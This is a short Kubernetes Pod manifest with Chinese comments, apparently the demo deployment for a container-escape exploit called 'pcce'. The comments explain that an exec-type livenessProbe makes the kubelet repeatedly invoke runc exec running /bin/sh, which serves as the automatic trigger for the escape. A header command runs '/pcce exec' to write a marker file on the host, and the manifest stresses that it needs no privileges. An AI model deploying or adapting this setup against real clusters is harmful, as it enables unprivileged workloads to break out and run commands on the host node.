# pcce exec mode demo
# 利用 livenessProbe exec 自动触发逃逸
# 部署后: kubectl exec -n pcce-demo pcce-exec -- /pcce exec --cmd 'touch /tmp/pwned-exec'
# 验证: 宿主机 ls /tmp/pwned-exec
apiVersion: v1
kind: Pod
metadata:
  name: pcce-exec
  namespace: pcce-demo
  labels:
    app: pcce-exec
spec:
  containers:
  - name: exploit
    image: ubuntu:22.04
    command: ["/bin/sh", "-c", "while sleep 3600; do :; done"]
    # livenessProbe exec 类型会触发 runc exec 进容器
    # kubelet 每 5 秒调一次 runc exec -- /bin/sh -c 'true'
    # 这就是 pcce exec 的自动触发点
    # 必须用 /bin/sh -c 形式，这样 runc exec 才会 execve /bin/sh
    # 如果直接 ["true"]，runc exec 直接 execve /usr/bin/true，不经过 /bin/sh
    livenessProbe:
      exec:
        command: ["/bin/sh", "-c", "true"]
      initialDelaySeconds: 10
      periodSeconds: 5
    securityContext:
      runAsUser: 1000
      runAsGroup: 1000
    resources:
      limits:
        memory: "128Mi"
        cpu: "200m"
  restartPolicy: Always
  # 不需要任何特权、hostPID、hostNetwork
